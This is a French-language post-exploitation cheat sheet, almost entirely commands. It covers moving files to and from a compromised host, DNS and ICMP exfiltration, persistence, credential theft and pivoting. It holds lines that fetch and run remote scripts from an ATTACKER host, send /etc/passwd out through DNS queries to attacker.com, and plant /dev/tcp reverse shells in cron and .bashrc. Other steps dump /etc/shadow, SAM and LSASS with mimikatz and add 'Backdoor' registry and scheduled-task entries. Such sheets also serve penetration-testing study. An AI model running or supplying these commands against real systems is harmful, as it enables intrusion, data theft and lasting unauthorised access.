# Post-exploitation et exfiltration de données

Techniques de transfert de fichiers, persistance et pivoting.

---

## Transfert de fichiers : attaquant vers cible

### Serveur HTTP Python (attaquant)

```bash
python3 -m http.server 8000
python -m SimpleHTTPServer 8000
```

### Téléchargement sur la cible (Linux)

```bash
wget http://ATTACKER:8000/file
curl http://ATTACKER:8000/file -o file
curl http://ATTACKER:8000/linpeas.sh | bash
```

### Téléchargement sur la cible (Windows)

```cmd
certutil -urlcache -split -f http://ATTACKER:8000/file file.exe
```

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/file','C:\temp\file')
Invoke-WebRequest -Uri 'http://ATTACKER:8000/file' -OutFile 'C:\temp\file'
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8000/script.ps1')
```

---

## Transfert de fichiers : cible vers attaquant

### Netcat

```bash
# Attaquant
nc -lvnp 4444 > file

# Cible
nc ATTACKER 4444 < file
```

### Base64 (petits fichiers)

```bash
# Cible
base64 file
# Copier la sortie, puis sur l'attaquant :
echo "BASE64STRING" | base64 -d > file
```

### HTTP POST

```bash
# Attaquant
python3 -c "from http.server import *; HTTPServer(('0.0.0.0',8000),SimpleHTTPRequestHandler).serve_forever()"

# Cible
curl -X POST -d @file http://ATTACKER:8000/
```

### SCP (si SSH disponible)

```bash
scp file user@ATTACKER:/tmp/
```

---

## SMB (Windows)

### Démarrer un serveur SMB (attaquant)

```bash
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user test -password test
```

### Transfert (cible Windows)

```cmd
copy file \\ATTACKER\share\
copy \\ATTACKER\share\file .
```

---

## Exfiltration DNS

Exfiltration de petites données via requêtes DNS.

```bash
cat /etc/passwd | base64 | tr -d '\n' | fold -w 63 | while read line; do nslookup $line.attacker.com; done
```

---

## Exfiltration ICMP

Via ping.

```bash
xxd -p -c 4 file | while read line; do ping -c 1 -p $line ATTACKER; done
```

---

## Persistance Linux

### Clé SSH

```bash
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

### Cron

```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" | crontab -
```

### .bashrc

```bash
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> ~/.bashrc
```

---

## Persistance Windows

### Clé de registre Run

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"
```

### Tâche planifiée

```cmd
schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onlogon
```

---

## Récupération de credentials Linux

### Fichier shadow

```bash
cat /etc/shadow
```

### Clés SSH

```bash
find / -name "id_rsa" 2>/dev/null
```

### Historique

```bash
cat ~/.bash_history
cat /home/*/.bash_history
```

### Dump mémoire

```bash
strings /dev/mem | grep -i password
```

---

## Récupération de credentials Windows

### SAM & SYSTEM

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

Puis utiliser `secretsdump.py`.

### Mimikatz

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Dump LSASS

```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

Puis avec mimikatz : `sekurlsa::minidump lsass.dmp`

---

## Pivoting

### SSH port forwarding

```bash
# Local forward
ssh -L 8080:internal:80 user@jumphost

# Remote forward
ssh -R 8080:localhost:80 user@attacker

# Dynamic (proxy SOCKS)
ssh -D 9050 user@jumphost
```

### Chisel

```bash
# Attaquant
chisel server -p 8000 --reverse

# Cible
chisel client ATTACKER:8000 R:8080:127.0.0.1:80
```

### Ligolo-ng

Outil moderne de pivoting.

### Proxychains

Configurer `/etc/proxychains.conf` puis :

```bash
proxychains nmap -sT internal_ip
```
